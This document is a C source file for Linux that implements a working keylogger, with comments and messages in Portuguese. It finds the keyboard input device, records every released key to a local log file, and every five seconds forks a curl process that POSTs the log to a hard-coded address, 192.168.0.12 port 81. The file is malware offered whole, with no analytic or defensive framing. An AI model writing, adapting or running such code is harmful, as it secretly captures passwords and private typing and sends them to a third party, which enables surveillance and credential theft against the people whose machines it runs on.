#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>

#define LINE_SIZE 512

typedef struct {
    int code;
    const char *name;
} KeyMap;

KeyMap keymap[] = {
    {0, "KEY_RESERVED"}, {1, "KEY_ESC"}, {2, "1"}, {3, "2"}, {4, "3"},
    {5, "4"}, {6, "5"}, {7, "6"}, {8, "7"}, {9, "8"},
    {10, "9"}, {11, "0"}, {12, "-"}, {13, "="}, {14, "BACKSPACE"},
    {15, "TAB"}, {16, "Q"}, {17, "W"}, {18, "E"}, {19, "R"},
    {20, "T"}, {21, "Y"}, {22, "U"}, {23, "I"}, {24, "O"},
    {25, "P"}, {26, "["}, {27, "]"}, {28, "ENTER\n"}, {29, "LEFTCTRL"},
    {30, "A"}, {31, "S"}, {32, "D"}, {33, "F"}, {34, "G"},
    {35, "H"}, {36, "J"}, {37, "K"}, {38, "L"}, {39, ";"},
    {40, "'"}, {41, "`"}, {42, "LEFTSHIFT"}, {43, "\\"}, {44, "Z"},
    {45, "X"}, {46, "C"}, {47, "V"}, {48, "B"}, {49, "N"},
    {50, "M"}, {51, ","}, {52, "."}, {53, "/"}, {54, "RIGHTSHIFT"},
    {55, "*"}, {56, "LEFTALT"}, {57, " "}, {58, "CAPSLOCK"},
};

#define KEYMAP_SIZE (sizeof(keymap) / sizeof(KeyMap))

const char* get_key_name(int code) {
    for (size_t i = 0; i < KEYMAP_SIZE; i++) {
        if (keymap[i].code == code)
            return keymap[i].name;
    }
    return "?";
}

char* find_keyboard_event() {
    FILE *f = fopen("/proc/bus/input/devices", "r");
    if (!f) return NULL;

    char line[LINE_SIZE];
    int is_keyboard = 0;
    char *event_path = NULL;

    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "Keyboard") || strstr(line, "keyboard") ) {
            is_keyboard = 1;
        }
        if (is_keyboard && strstr(line, "Handlers")) {
            char *ptr = strstr(line, "event");
            if (ptr) {
                char event[16] = {0};
                sscanf(ptr, "%15s", event);

                event_path = malloc(32);
                snprintf(event_path, 32, "/dev/input/%s", event);
                break;
            }
        }
        if (line[0] == '\n') {
            is_keyboard = 0;  // fim de bloco
        }
    }

    fclose(f);
    return event_path;
}

int main() {
    printf("%s",find_keyboard_event());
    char *device = find_keyboard_event();
    //snprintf(device, 32, "/dev/input/event3");
    if (!device) {
        fprintf(stderr, "Não foi possível encontrar o teclado em /proc/bus/input/devices\n");
        return 1;
    }

    printf("Dispositivo teclado encontrado: %s\n", device);

    int fd = open(device, O_RDONLY);
    if (fd < 0) {
        perror("Erro ao abrir o dispositivo");
        free(device);
        return 1;
    }
    free(device);

    FILE *log = fopen("./log", "w");
    if (!log) {
        perror("Erro ao abrir arquivo de log");
        close(fd);
        return 1;
    }
    setbuf(log, NULL);

    struct input_event ev;
    time_t t_last = time(NULL);

    while (1) {
        ssize_t bytes = read(fd, &ev, sizeof(ev));
        if (bytes < (ssize_t) sizeof(ev)) continue;

        if (ev.type == EV_KEY && ev.value == 0) { // tecla liberada
            const char *name = get_key_name(ev.code);
            fprintf(log, "%s", name);
        }

        time_t now = time(NULL);
        if (now - t_last > 5) {
            t_last = now;
            pid_t pid = fork();
            if (pid == 0) {
                execlp("curl", "curl", "-d", "@log", "-X", "POST", "192.168.0.12:81", NULL);
                exit(1);
            } else if (pid > 0) {
                waitpid(pid, NULL, 0);
            }
        }
    }

    fclose(log);
    close(fd);
    return 0;
}
